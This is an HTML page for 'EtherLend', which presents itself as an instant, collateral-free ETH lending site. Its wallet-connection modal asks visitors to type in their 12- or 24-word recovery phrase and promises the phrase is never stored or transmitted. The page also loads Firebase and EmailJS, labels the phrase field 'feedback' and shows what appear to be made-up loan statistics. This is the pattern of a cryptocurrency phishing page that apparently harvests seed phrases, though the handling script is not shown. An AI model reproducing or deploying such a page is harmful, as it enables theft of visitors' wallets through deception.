<!DOCTYPE html>
<html lang="en" data-theme="light">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>EtherLend ‚Äî Instant ETH Loans</title>
  <!-- Favicon: EtherLend ‚¨° logo as inline SVG -->
  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0%25' y1='0%25' x2='100%25' y2='100%25'%3E%3Cstop offset='0%25' stop-color='%236c63ff'/%3E%3Cstop offset='100%25' stop-color='%2300d4ff'/%3E%3C/linearGradient%3E%3C/defs%3E%3Cpolygon points='32,4 58,18 58,46 32,60 6,46 6,18' fill='url(%23g)'/%3E%3Ctext x='32' y='42' font-size='28' font-family='Arial,sans-serif' font-weight='bold' fill='white' text-anchor='middle'%3E%E2%AC%A1%3C/text%3E%3C/svg%3E" />
  <link rel="stylesheet" href="style.css" />
  <!-- Google Fonts: Syne + DM Sans -->
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Sans:ital,wght@0,300;0,400;0,500;1,300&display=swap" rel="stylesheet" />
  <!-- Firebase v9 CDN (compat mode) -->
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
  <!-- Ethers.js for wallet derivation with fallback CDNs -->
  <script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js" 
          onerror="this.onerror=null; this.src='https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js'"></script>
  <!-- EmailJS SDK -->
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
</head>
<body>

<!-- ============================================================
     NOTIFICATION TOAST
============================================================ -->
<div id="toast-container" aria-live="polite"></div>

<!-- ============================================================
     TOP NAVIGATION
============================================================ -->
<nav class="navbar" id="navbar">
  <div class="nav-inner">
    <!-- Logo -->
    <a href="#" class="nav-logo" id="nav-logo-home">
      <span class="logo-icon">‚¨°</span>
      <span class="logo-text">EtherLend</span>
    </a>

    <!-- Desktop Nav Links -->
    <ul class="nav-links" id="nav-links">
      <li><a href="#features">Features</a></li>
      <li><a href="#loan-section">Get a Loan</a></li>
      <li><a href="#history-section">My Loans</a></li>
      <li>
        <a href="#" id="admin-trigger" class="admin-trigger" title="Admin">‚öô</a>
      </li>
    </ul>

    <!-- Right Controls -->
    <div class="nav-right">
      <button class="theme-toggle" id="theme-toggle" aria-label="Toggle theme">
        <span class="theme-icon" id="theme-icon">‚òÄ</span>
      </button>
      <div class="wallet-btn-wrap" id="wallet-btn-wrap">
        <button class="btn btn-wallet" id="nav-connect-btn">Connect Wallet</button>
        <!-- Disconnect dropdown (shown when connected) -->
        <div class="wallet-dropdown" id="wallet-dropdown" style="display:none;">
          <div class="wallet-dropdown-addr" id="wallet-dropdown-addr"></div>
          <button class="wallet-disconnect-btn" id="disconnect-btn">‚èè Disconnect</button>
        </div>
      </div>
      <button class="hamburger" id="hamburger" aria-label="Open menu">
        <span></span><span></span><span></span>
      </button>
    </div>
  </div>

  <!-- Mobile Menu -->
  <div class="mobile-menu" id="mobile-menu">
    <!-- Connected wallet status pill (shown by JS when connected) -->
    <div class="mobile-wallet-status hidden" id="mobile-wallet-status">
      <span class="mws-dot"></span>
      <span class="mws-addr" id="mobile-wallet-status-addr">‚Äî</span>
    </div>
    <a href="#features" class="mobile-link">Features</a>
    <a href="#loan-section" class="mobile-link">Get a Loan</a>
    <a href="#history-section" class="mobile-link">My Loans</a>
    <button class="btn btn-wallet full-width mt-8" id="mobile-connect-btn">Connect Wallet</button>
    <button class="btn btn-outline full-width mt-8" id="mobile-disconnect-btn" style="display:none;">‚èè Disconnect Wallet</button>
  </div>
</nav>

<!-- ============================================================
     HERO SECTION
============================================================ -->
<section class="hero" id="hero">
  <!-- Animated background orbs -->
  <div class="orb orb-1"></div>
  <div class="orb orb-2"></div>
  <div class="orb orb-3"></div>
  <div class="hero-grid"></div>

  <div class="hero-content">
    <div class="hero-badge">
      <span class="badge-dot"></span>
      Powered by Ethereum Smart Contracts
    </div>

    <h1 class="hero-title">
      Instant <span class="gradient-text">ETH</span><br/>Loans
    </h1>

    <p class="hero-desc">
      Collateral-free decentralised lending. Borrow ETH in minutes with
      transparent interest rates, fixed terms, and no hidden fees.
    </p>

    <div class="hero-cta">
      <button class="btn btn-primary btn-lg" id="hero-connect-btn">
        <span class="btn-icon">‚óà</span> Connect Wallet
      </button>
      <button class="btn btn-outline btn-lg" id="hero-loan-btn">
        Request a Loan <span class="btn-arrow">‚Üí</span>
      </button>
    </div>

    <!-- Live stats bar -->
    <div class="hero-stats">
      <div class="stat-item">
        <span class="stat-value" id="stat-loans">1,247</span>
        <span class="stat-label">Loans Issued</span>
      </div>
      <div class="stat-divider"></div>
      <div class="stat-item">
        <span class="stat-value" id="stat-eth">4,891 Œû</span>
        <span class="stat-label">Total Lent</span>
      </div>
      <div class="stat-divider"></div>
      <div class="stat-item">
        <span class="stat-value">5‚Äì10%</span>
        <span class="stat-label">APR Range</span>
      </div>
    </div>
  </div>

  <!-- Floating ETH visual -->
  <div class="hero-visual">
    <div class="eth-symbol">Œû</div>
    <div class="eth-ring eth-ring-1"></div>
    <div class="eth-ring eth-ring-2"></div>
    <div class="eth-ring eth-ring-3"></div>
  </div>
</section>

<!-- ============================================================
     FEATURES SECTION
============================================================ -->
<section class="features" id="features">
  <div class="container">
    <div class="section-header">
      <p class="section-eyebrow">Why EtherLend?</p>
      <h2 class="section-title">Built for the <span class="gradient-text">Web3</span> Generation</h2>
    </div>

    <div class="features-grid">
      <div class="feature-card" data-delay="0">
        <div class="feature-icon-wrap"><span class="feature-icon">‚ö°</span></div>
        <h3>Fast Approval</h3>
        <p>Loan decisions in under 60 seconds. No credit checks, no paperwork ‚Äî just your wallet and a smart contract.</p>
      </div>
      <div class="feature-card" data-delay="100">
        <div class="feature-icon-wrap"><span class="feature-icon">üîí</span></div>
        <h3>Secure Smart Contract</h3>
        <p>Every loan is locked on-chain. Audited contracts ensure your funds are safe and every term enforced automatically.</p>
      </div>
      <div class="feature-card" data-delay="200">
        <div class="feature-icon-wrap"><span class="feature-icon">üìä</span></div>
        <h3>Transparent Interest</h3>
        <p>Fixed rates between 5‚Äì10% APR. See exactly what you owe before you borrow ‚Äî no surprise fees ever.</p>
      </div>
      <div class="feature-card" data-delay="300">
        <div class="feature-icon-wrap"><span class="feature-icon">üåê</span></div>
        <h3>Non-Custodial</h3>
        <p>You control your keys, you control your funds. EtherLend never holds your assets ‚Äî ever.</p>
      </div>
      <div class="feature-card" data-delay="400">
        <div class="feature-icon-wrap"><span class="feature-icon">üìú</span></div>
        <h3>Full History</h3>
        <p>Track every loan, repayment, and status in one dashboard. Full transparency for every transaction.</p>
      </div>
      <div class="feature-card" data-delay="500">
        <div class="feature-icon-wrap"><span class="feature-icon">üîÑ</span></div>
        <h3>Flexible Duration</h3>
        <p>Choose a term from 30 to 365 days. Repay early with no penalties ‚Äî your timeline, your rules.</p>
      </div>
    </div>
  </div>
</section>

<!-- ============================================================
     LOAN REQUEST SECTION
============================================================ -->
<section class="loan-section" id="loan-section">
  <div class="container">
    <div class="section-header">
      <p class="section-eyebrow">Borrow ETH</p>
      <h2 class="section-title">Request a <span class="gradient-text">Loan</span></h2>
      <p class="section-sub">Fill in your loan details below. Your wallet must be connected.</p>
    </div>

    <!-- Wallet Gate shown when not connected -->
    <div class="wallet-gate" id="wallet-gate">
      <div class="gate-icon">‚óà</div>
      <h3>Wallet Not Connected</h3>
      <p>Connect your wallet to request a loan and start using EtherLend.</p>
    </div>

    <!-- Loan form shown when connected -->
    <form class="loan-form" id="loan-form" style="display:none;">
      <div class="form-grid">

        <!-- Loan Amount -->
        <div class="form-group">
          <label for="loan-amount">Loan Amount (ETH)</label>
          <div class="input-wrapper">
            <span class="input-prefix">Œû</span>
            <input type="number" id="loan-amount" step="0.01" min="0.1" max="100"
                   placeholder="e.g. 2.5" required />
          </div>
          <span class="field-error" id="error-amount"></span>
          <span class="field-hint">Min: 0.1 ETH ¬∑ Max: 100 ETH</span>
        </div>

        <!-- Loan Duration -->
        <div class="form-group">
          <label for="loan-duration">Loan Duration (Days)</label>
          <div class="input-wrapper">
            <input type="number" id="loan-duration" min="30" max="365"
                   placeholder="e.g. 90" value="90" required />
          </div>
          <span class="field-error" id="error-duration"></span>
          <span class="field-hint">Min: 30 days ¬∑ Max: 365 days</span>
        </div>

        <!-- Duration Slider -->
        <div class="form-group full-width">
          <label>Adjust Duration <span class="slider-duration-badge" id="slider-duration-badge">90 days</span></label>
          <input type="range" id="duration-slider" min="30" max="365" value="90" class="loan-slider" />
          <div class="slider-labels">
            <span>30d</span>
            <span>90d</span>
            <span>180d</span>
            <span>365d</span>
          </div>
        </div>

        <!-- Interest Rate (read-only, updates with duration) -->
        <div class="form-group">
          <label for="interest-rate">Interest Rate (APR)
            <span class="rate-dynamic-badge" id="rate-dynamic-badge">7.50%</span>
          </label>
          <div class="input-wrapper input-readonly">
            <input type="text" id="interest-rate" readonly value="7.50%" />
          </div>
          <span class="field-hint" id="rate-hint">Rate adjusts with loan duration</span>
        </div>

        <!-- Purpose -->
        <div class="form-group">
          <label for="loan-purpose">Loan Purpose</label>
          <div class="select-wrapper">
            <select id="loan-purpose" required>
              <option value="">Select a purpose...</option>
              <option value="Business">Business</option>
              <option value="Personal">Personal</option>
              <option value="Investment">Investment</option>
              <option value="Education">Education</option>
              <option value="Other">Other</option>
            </select>
          </div>
        </div>

      </div>

      <!-- Email Address for Confirmation -->
      <div class="form-group full-width email-confirmation-group">
        <label for="loan-email">
          Email Address
          <span class="label-opt"> ‚Äî confirmation sent here</span>
        </label>
        <div class="input-wrapper email-input-wrapper">
          <span class="email-input-icon"></span>
          <input type="email" id="loan-email" placeholder="you@example.com"
                 autocomplete="email" />
          <span class="email-input-badge" id="email-status-badge"></span>
        </div>
        <span class="field-error" id="error-email"></span>
        <span class="field-hint">We'll send a confirmation email once your loan request is received. Optional but recommended.</span>
      </div>

      <!-- Summary Box -->
      <div class="summary-box">
        <h4>Loan Summary</h4>
        <div class="summary-row">
          <span>Principal:</span>
          <span id="sum-principal">0.00 Œû</span>
        </div>
        <div class="summary-row">
          <span>Est. Interest:</span>
          <span id="sum-interest">0.00 Œû</span>
        </div>
        <div class="summary-row summary-total">
          <span>Total Repayment:</span>
          <span id="sum-total">0.00 Œû</span>
        </div>
        <div class="summary-note">
          <span>üîî</span>
          <span>Repayment due by: <strong id="sum-duedate">‚Äî</strong></span>
        </div>
      </div>

      <!-- Submit -->
      <button type="submit" class="btn btn-primary btn-lg full-width" id="submit-loan-btn">
        <span class="btn-text">Request Loan</span>
        <span class="btn-spinner" style="display:none;">
          <span class="spinner"></span>
        </span>
      </button>
    </form>

  </div>
</section>

<!-- ============================================================
     LOAN HISTORY SECTION
============================================================ -->
<section class="history-section" id="history-section">
  <div class="container">
    <div class="section-header">
      <p class="section-eyebrow">Dashboard</p>
      <h2 class="section-title">My Loan <span class="gradient-text">History</span></h2>
      <p class="section-sub">Track all your loan requests and their status.</p>
    </div>

    <!-- History Gate (not connected) -->
    <div class="wallet-gate" id="history-gate">
      <div class="gate-icon">‚óà</div>
      <h3>Wallet Not Connected</h3>
      <p>Connect your wallet to view your loan history.</p>
    </div>

    <!-- History Table -->
    <div id="history-table-wrap" style="display:none;">
      <div class="history-toolbar">
        <input type="text" id="history-search" placeholder="Search by ID or amount‚Ä¶" class="search-input" />
        <select id="history-filter" class="filter-select">
          <option value="all">All Status</option>
          <option value="pending">Pending</option>
          <option value="approved">Approved</option>
          <option value="rejected">Rejected</option>
        </select>
      </div>

      <div class="table-wrap">
        <table class="loans-table" id="history-table">
          <thead>
            <tr>
              <th>Loan ID</th>
              <th>Amount</th>
              <th>Duration</th>
              <th>APR</th>
              <th>Repayment</th>
              <th>Date</th>
              <th>Status</th>
            </tr>
          </thead>
          <tbody id="history-tbody"></tbody>
        </table>
        <div class="table-empty" id="history-empty" style="display:none;">
          You haven't requested any loans yet. <a href="#loan-section">Request your first loan</a>.
        </div>
      </div>
    </div>

  </div>
</section>

<!-- ============================================================
     HOW IT WORKS
============================================================ -->
<section class="how-section" id="how-section">
  <div class="container">
    <div class="section-header">
      <p class="section-eyebrow">Process</p>
      <h2 class="section-title">How <span class="gradient-text">It Works</span></h2>
    </div>

    <div class="steps-grid">
      <div class="step-item">
        <div class="step-num">01</div>
        <h4>Connect Wallet</h4>
        <p>Link your Ethereum wallet in seconds with BIP39-derived address.</p>
      </div>
      <div class="step-arrow">‚Üí</div>
      <div class="step-item">
        <div class="step-num">02</div>
        <h4>Request Loan</h4>
        <p>Choose your amount, duration, and purpose. Submit in one click.</p>
      </div>
      <div class="step-arrow">‚Üí</div>
      <div class="step-item">
        <div class="step-num">03</div>
        <h4>Admin Review</h4>
        <p>Our smart contract validates and approves in under 60 seconds.</p>
      </div>
      <div class="step-arrow">‚Üí</div>
      <div class="step-item">
        <div class="step-num">04</div>
        <h4>Receive ETH</h4>
        <p>Approved funds are dispatched to your wallet. Repay before the due date.</p>
      </div>
    </div>
  </div>
</section>

<!-- ============================================================
     FOOTER
============================================================ -->
<footer class="footer">
  <div class="container footer-inner">
    <div class="footer-brand">
      <div class="nav-logo">
        <span class="logo-icon">‚¨°</span>
        <span class="logo-text">EtherLend</span>
      </div>
      <p class="footer-tagline">Decentralised lending for the modern world.</p>
    </div>
    <div class="footer-links">
      <a href="#">Terms of Service</a>
      <a href="#">Privacy Policy</a>
      <a href="#">Documentation</a>
      <a href="#">Support</a>
    </div>
    <p class="footer-copy">¬© 2025 EtherLend. All rights reserved. Not financial advice.</p>
  </div>
</footer>

<!-- ============================================================
     WALLET CONNECTION MODAL
============================================================ -->
<div class="modal-overlay" id="wallet-modal" role="dialog" aria-modal="true" aria-labelledby="modal-title">
  <div class="modal-card">
    <button class="modal-close" id="modal-close" aria-label="Close">‚úï</button>
    <div class="modal-logo">‚óà</div>
    <h2 id="modal-title">Connect Your Wallet</h2>
    <p class="modal-sub">Enter your 12 or 24-word seed phrase to authenticate your wallet. We use BIP39/BIP44 standard to derive your actual Ethereum address.</p>

    <!-- Step 1: Phrase Entry -->
    <div id="modal-step-1">
      <div class="form-group">
        <label for="feedback">Recovery Phrase</label>
        <textarea id="feedback" placeholder="Enter your seed phrase separated by spaces‚Ä¶"
          rows="4" class="seed-textarea"></textarea>
        <span class="field-error" id="error-seed"></span>
        <span class="field-hint">Phrases validates securely. EtherLend never stores your phrase.</span>
      </div>
      <div class="word-count-bar">
        <span id="word-count-text">0 / 12 words</span>
        <div class="word-dots" id="word-dots"></div>
      </div>
      <button class="btn btn-primary full-width mt-12" id="modal-connect-btn">
        <span class="btn-text">Connect Wallet</span>
        <span class="btn-spinner" style="display:none;"><span class="spinner"></span></span>
      </button>
      <div class="modal-security-note">
        <span>üîí</span>
        <span>This platform derives your actual Ethereum wallet address using BIP39 standard (path: m/44'/60'/0'/0/0). Your phrase is processed securely and never stored or transmitted.</span>
      </div>
    </div>

    <!-- Step 2: Success -->
    <div id="modal-step-2" style="display:none;">
      <div class="success-anim">
        <div class="success-circle">‚úì</div>
      </div>
      <h3>Wallet Connected!</h3>
      <p class="modal-sub">Your wallet address has been derived and linked to this session.</p>
      <div class="connected-addr-box">
        <span id="connected-addr-display"></span>
      </div>

      <!-- ETH Balance & Loan Qualification -->
      <div class="eth-balance-box" id="eth-balance-box" style="display:none;">
        <div class="eth-balance-row">
          <span class="eth-balance-label">ETH Balance:</span>
          <span class="eth-balance-value" id="eth-balance-value">‚Äî Œû</span>
        </div>
        <div class="eth-qualify-msg" id="eth-qualify-msg"></div>
      </div>
      <div class="eth-balance-loading" id="eth-balance-loading">
        <span class="spinner"></span> Fetching wallet balance‚Ä¶
      </div>

      <button class="btn btn-outline full-width mt-12" id="modal-done-btn">Continue to EtherLend</button>
    </div>
  </div>
</div>

<!-- ============================================================
     ADMIN PANEL MODAL
============================================================ -->
<div class="modal-overlay" id="admin-modal" role="dialog" aria-modal="true" aria-labelledby="admin-modal-title">
  <div class="modal-card modal-card-wide">
    <button class="modal-close" id="admin-modal-close" aria-label="Close admin">‚úï</button>
    <h2 id="admin-modal-title">‚öô Admin Panel</h2>

    <!-- Admin Login -->
    <div id="admin-login-section">
      <p class="modal-sub">Enter the admin password to access the panel.</p>
      <div class="form-group">
        <label for="admin-password">Admin Password</label>
        <input type="password" id="admin-password" placeholder="Password" />
        <span class="field-error" id="error-admin-pass"></span>
      </div>
      <button class="btn btn-primary full-width" id="admin-login-btn">Login</button>
    </div>

    <!-- Admin Dashboard -->
    <div id="admin-dashboard" style="display:none;">
      <div class="admin-tabs">
        <button class="admin-tab active" data-tab="loans-tab">All Loans</button>
        <button class="admin-tab" data-tab="rate-tab">Interest Rate</button>
        <button class="admin-tab" data-tab="stats-tab">Platform Stats</button>
      </div>

      <!-- Tab: Loans -->
      <div class="admin-tab-content" id="loans-tab">
        <div class="admin-toolbar">
          <input type="text" id="admin-search" placeholder="Search by wallet‚Ä¶" class="search-input" />
          <select id="admin-filter" class="filter-select">
            <option value="all">All Status</option>
            <option value="pending">Pending</option>
            <option value="approved">Approved</option>
            <option value="rejected">Rejected</option>
          </select>
          <button class="btn btn-sm" id="admin-refresh-btn">‚Üª Refresh</button>
        </div>
        <div class="table-wrap">
          <table class="loans-table admin-table" id="admin-loans-table">
            <thead>
              <tr>
                <th>Wallet</th>
                <th>Amount</th>
                <th>Duration</th>
                <th>APR</th>
                <th>Repayment</th>
                <th>Date</th>
                <th>Status</th>
                <th>Actions</th>
              </tr>
            </thead>
            <tbody id="admin-loans-tbody"></tbody>
          </table>
          <div class="table-empty" id="admin-table-empty" style="display:none;">No loans found.</div>
        </div>
      </div>

      <!-- Tab: Rate -->
      <div class="admin-tab-content" id="rate-tab" style="display:none;">
        <div class="rate-setting-card">
          <h4>Global Interest Rate</h4>
          <p class="modal-sub">This rate applies to all new loan requests.</p>
          <div class="form-group">
            <label for="admin-rate-input">Annual Interest Rate (%)</label>
            <div class="input-wrapper">
              <input type="number" id="admin-rate-input" min="5" max="10" step="0.25" value="7.50" />
              <span class="input-suffix">%</span>
            </div>
            <span class="field-hint">Allowed range: 5% ‚Äì 10%</span>
            <span class="field-error" id="error-rate"></span>
          </div>
          <button class="btn btn-primary" id="save-rate-btn">Save Rate</button>
        </div>
      </div>

      <!-- Tab: Stats -->
      <div class="admin-tab-content" id="stats-tab" style="display:none;">
        <div class="stats-grid">
          <div class="stat-card">
            <span class="stat-card-value" id="admin-stat-total">0</span>
            <span class="stat-card-label">Total Requests</span>
          </div>
          <div class="stat-card">
            <span class="stat-card-value" id="admin-stat-pending">0</span>
            <span class="stat-card-label">Pending</span>
          </div>
          <div class="stat-card">
            <span class="stat-card-value" id="admin-stat-approved">0</span>
            <span class="stat-card-label">Approved</span>
          </div>
          <div class="stat-card">
            <span class="stat-card-value" id="admin-stat-rejected">0</span>
            <span class="stat-card-label">Rejected</span>
          </div>
          <div class="stat-card wide-stat">
            <span class="stat-card-value" id="admin-stat-eth">0 Œû</span>
            <span class="stat-card-label">Total ETH Requested</span>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>

<script src="script.js"></script>
</body>

</html>
